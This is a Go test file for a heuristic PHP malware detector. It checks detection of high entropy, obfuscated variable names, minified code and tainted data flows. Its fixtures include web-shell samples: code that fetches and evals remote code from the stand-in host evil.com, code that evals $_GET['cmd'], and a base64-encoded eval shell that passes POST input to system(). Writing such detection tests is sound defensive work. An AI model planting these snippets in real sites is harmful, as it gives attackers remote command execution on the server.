package heuristic

import (
	"context"
	"strings"
	"testing"

	"github.com/IvanShishkin/houndoom/pkg/models"
)

func TestNewHeuristicDetector(t *testing.T) {
	hd := NewHeuristicDetector()

	if hd == nil {
		t.Fatal("NewHeuristicDetector returned nil")
	}

	if hd.BaseDetector == nil {
		t.Error("BaseDetector should be initialized")
	}

	if !hd.entropyEnabled {
		t.Error("entropyEnabled should be true by default")
	}

	if !hd.combinationEnabled {
		t.Error("combinationEnabled should be true by default")
	}

	if !hd.variableEnabled {
		t.Error("variableEnabled should be true by default")
	}

	if !hd.structureEnabled {
		t.Error("structureEnabled should be true by default")
	}

	if !hd.dataFlowEnabled {
		t.Error("dataFlowEnabled should be true by default")
	}

	if hd.combinationAnalyzer == nil {
		t.Error("combinationAnalyzer should be initialized")
	}

	if hd.variableAnalyzer == nil {
		t.Error("variableAnalyzer should be initialized")
	}

	if hd.dataFlowAnalyzer == nil {
		t.Error("dataFlowAnalyzer should be initialized")
	}

	if hd.contextDetector == nil {
		t.Error("contextDetector should be initialized")
	}

	if hd.scoringRules == nil {
		t.Error("scoringRules should be initialized")
	}
}

func TestHeuristicDetector_Detect_CleanCode(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/clean.php",
		Content: []byte(`<?php
function greet($name) {
    return "Hello, " . htmlspecialchars($name);
}

$userName = "World";
echo greet($userName);
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	if len(findings) > 0 {
		t.Errorf("Expected no findings for clean code, got %d", len(findings))
		for _, f := range findings {
			t.Logf("  Finding: %s - %s", f.SignatureID, f.SignatureName)
		}
	}
}

func TestHeuristicDetector_Detect_SmallFile(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	// Files smaller than 100 bytes should be skipped
	file := &models.File{
		Path:    "/var/www/small.php",
		Content: []byte(`<?php echo 1; ?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	if len(findings) > 0 {
		t.Error("Expected no findings for small file")
	}
}

func TestHeuristicDetector_Detect_ObfuscatedCode(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	// Create high entropy content
	var highEntropyBytes []byte
	for i := 0; i < 256; i++ {
		highEntropyBytes = append(highEntropyBytes, byte(i))
	}
	highEntropyData := string(highEntropyBytes)
	for i := 0; i < 5; i++ {
		highEntropyData += string(highEntropyBytes)
	}

	file := &models.File{
		Path:    "/var/www/obfuscated.php",
		Content: []byte(`<?php ` + highEntropyData + ` ?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	// Should detect high entropy
	hasEntropyFinding := false
	for _, f := range findings {
		if f.SignatureID == "HEUR-001" {
			hasEntropyFinding = true
			break
		}
	}

	if !hasEntropyFinding {
		t.Error("Expected to find high entropy detection (HEUR-001)")
	}
}

func TestHeuristicDetector_Detect_SuspiciousCombination(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/backdoor.php",
		Content: []byte(`<?php
// Some padding to make file > 100 bytes
// More padding here to ensure detection
$code = file_get_contents("http://evil.com/payload.php");
eval($code);
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	// Should detect suspicious combination
	hasCombinationFinding := false
	for _, f := range findings {
		if f.SignatureID == "HEUR-002" {
			hasCombinationFinding = true
			break
		}
	}

	if !hasCombinationFinding {
		t.Error("Expected to find suspicious combination detection (HEUR-002)")
		for _, f := range findings {
			t.Logf("  Found: %s - %s", f.SignatureID, f.SignatureName)
		}
	}
}

func TestHeuristicDetector_Detect_DataFlow(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/injection.php",
		Content: []byte(`<?php
// Some padding to make the file larger than 100 bytes
// This ensures the heuristic detector processes the file
$cmd = $_GET['cmd'];
eval($cmd);
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	// Should detect dangerous data flow
	hasDataFlowFinding := false
	for _, f := range findings {
		if f.SignatureID == "HEUR-DF-001" {
			hasDataFlowFinding = true
			break
		}
	}

	if !hasDataFlowFinding {
		t.Error("Expected to find data flow detection (HEUR-DF-001)")
		for _, f := range findings {
			t.Logf("  Found: %s - %s", f.SignatureID, f.SignatureName)
		}
	}
}

func TestHeuristicDetector_Detect_SuspiciousVariables(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/vars.php",
		Content: []byte(`<?php
// Padding for file size requirement
// More padding to ensure file is processed
$O0O0O0 = "payload1";
$O00O0O = "payload2";
$OO0O00 = "payload3";
$_0x4a3b = "data1";
$_0xDEAD = "data2";
$___secret___ = "hidden";
echo $O0O0O0;
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	// Should detect suspicious variables
	hasVarFinding := false
	for _, f := range findings {
		if f.SignatureID == "HEUR-003" {
			hasVarFinding = true
			break
		}
	}

	if !hasVarFinding {
		t.Error("Expected to find suspicious variable detection (HEUR-003)")
		for _, f := range findings {
			t.Logf("  Found: %s - %s", f.SignatureID, f.SignatureName)
		}
	}
}

func TestHeuristicDetector_Detect_MinifiedCode(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	// Create a very long single line
	longLine := strings.Repeat("$x=1;", 500)

	file := &models.File{
		Path:    "/var/www/minified.php",
		Content: []byte(`<?php ` + longLine + ` ?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	// Should detect minified code
	hasMinifiedFinding := false
	for _, f := range findings {
		if f.SignatureID == "HEUR-005" {
			hasMinifiedFinding = true
			break
		}
	}

	if !hasMinifiedFinding {
		t.Error("Expected to find minified code detection (HEUR-005)")
		for _, f := range findings {
			t.Logf("  Found: %s - %s", f.SignatureID, f.SignatureName)
		}
	}
}

func TestHeuristicDetector_Detect_MultipleFindings(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	// Create high entropy content
	var highEntropyBytes []byte
	for i := 0; i < 256; i++ {
		highEntropyBytes = append(highEntropyBytes, byte(i))
	}
	highEntropyData := string(highEntropyBytes)

	file := &models.File{
		Path: "/var/www/complex.php",
		Content: []byte(`<?php
// Padding to ensure file is large enough
$O0O0O0 = "obfuscated_var";
$cmd = $_GET['cmd'];
$data = file_get_contents("http://evil.com/shell.php");
eval($cmd);
eval($data);
$payload = "` + highEntropyData + `";
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	// Should have multiple findings
	if len(findings) < 2 {
		t.Errorf("Expected multiple findings, got %d", len(findings))
	}

	// Log all findings for debugging
	t.Logf("Total findings: %d", len(findings))
	for _, f := range findings {
		t.Logf("  %s: %s (severity: %s)", f.SignatureID, f.SignatureName, f.Severity)
	}
}

func TestHeuristicDetector_FindingMetadata(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/test.php",
		Content: []byte(`<?php
// Padding for file size
// More padding here
$cmd = $_GET['cmd'];
eval($cmd);
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	for _, f := range findings {
		// Check that findings have required fields
		if f.File == nil {
			t.Error("Finding should have File reference")
		}

		if f.SignatureID == "" {
			t.Error("Finding should have SignatureID")
		}

		if f.SignatureName == "" {
			t.Error("Finding should have SignatureName")
		}

		if f.Description == "" {
			t.Error("Finding should have Description")
		}

		if f.Severity == "" {
			t.Error("Finding should have Severity")
		}

		// Check metadata
		if f.Metadata == nil {
			t.Error("Finding should have Metadata")
		}

		isHeuristic, ok := f.Metadata["is_heuristic"].(bool)
		if !ok || !isHeuristic {
			t.Error("Finding metadata should have is_heuristic=true")
		}
	}
}

func TestHeuristicDetector_RiskScore(t *testing.T) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/risky.php",
		Content: []byte(`<?php
// Some padding for the file size
// Additional padding to ensure processing
$cmd = $_GET['cmd'];
eval($cmd);
?>`),
	}

	findings, err := hd.Detect(ctx, file)

	if err != nil {
		t.Fatalf("Detect() returned error: %v", err)
	}

	for _, f := range findings {
		if f.RiskScore == nil {
			continue
		}

		// Check RiskScore fields
		if f.RiskScore.Contexts == nil {
			t.Error("RiskScore.Contexts should not be nil")
		}

		// NormalizedScore should be in valid range
		if f.RiskScore.NormalizedScore < 0 || f.RiskScore.NormalizedScore > 100 {
			t.Errorf("NormalizedScore = %d, should be 0-100", f.RiskScore.NormalizedScore)
		}
	}
}

func TestHeuristicDetector_FormatSuspiciousVars(t *testing.T) {
	hd := NewHeuristicDetector()

	tests := []struct {
		name  string
		vars  []SuspiciousVariable
		want  string
		check func(result string) bool
	}{
		{
			name:  "empty list",
			vars:  nil,
			want:  "",
			check: func(r string) bool { return r == "" },
		},
		{
			name: "single var",
			vars: []SuspiciousVariable{
				{Name: "O0O0O0"},
			},
			check: func(r string) bool { return r == "$O0O0O0" },
		},
		{
			name: "multiple vars",
			vars: []SuspiciousVariable{
				{Name: "a"},
				{Name: "b"},
				{Name: "c"},
			},
			check: func(r string) bool {
				return strings.Contains(r, "$a") &&
					strings.Contains(r, "$b") &&
					strings.Contains(r, "$c")
			},
		},
		{
			name: "more than 5 vars - truncated",
			vars: []SuspiciousVariable{
				{Name: "v1"}, {Name: "v2"}, {Name: "v3"},
				{Name: "v4"}, {Name: "v5"}, {Name: "v6"},
				{Name: "v7"},
			},
			check: func(r string) bool {
				return strings.Contains(r, "... and") &&
					strings.Contains(r, "more")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := hd.formatSuspiciousVars(tt.vars)

			if !tt.check(result) {
				t.Errorf("formatSuspiciousVars() = %q, check failed", result)
			}
		})
	}
}

func TestHeuristicDetector_SupportedExtensions(t *testing.T) {
	hd := NewHeuristicDetector()

	// Check that detector supports expected PHP extensions
	supportedExts := []string{"php", "php3", "php4", "php5", "phtml", "inc"}

	for _, ext := range supportedExts {
		supported := false
		for _, e := range hd.SupportedExtensions() {
			if e == ext {
				supported = true
				break
			}
		}
		if !supported {
			t.Errorf("Expected extension %q to be supported", ext)
		}
	}
}

// Benchmarks

func BenchmarkHeuristicDetector_Detect(b *testing.B) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/test.php",
		Content: []byte(`<?php
// Some normal looking code
function processUser($data) {
    $name = $data['name'];
    $email = $data['email'];
    return array(
        'name' => htmlspecialchars($name),
        'email' => filter_var($email, FILTER_SANITIZE_EMAIL)
    );
}
$user = processUser($_POST);
echo json_encode($user);
?>`),
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		hd.Detect(ctx, file)
	}
}

func BenchmarkHeuristicDetector_Detect_MaliciousCode(b *testing.B) {
	hd := NewHeuristicDetector()
	ctx := context.Background()

	file := &models.File{
		Path: "/var/www/shell.php",
		Content: []byte(`<?php
$O0O0O0 = base64_decode("ZXZhbCgkX1BPU1RbJ2NtZCddKTs=");
$cmd = $_POST['cmd'];
eval($O0O0O0);
system($cmd);
file_put_contents('log.txt', $cmd);
?>`),
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		hd.Detect(ctx, file)
	}
}
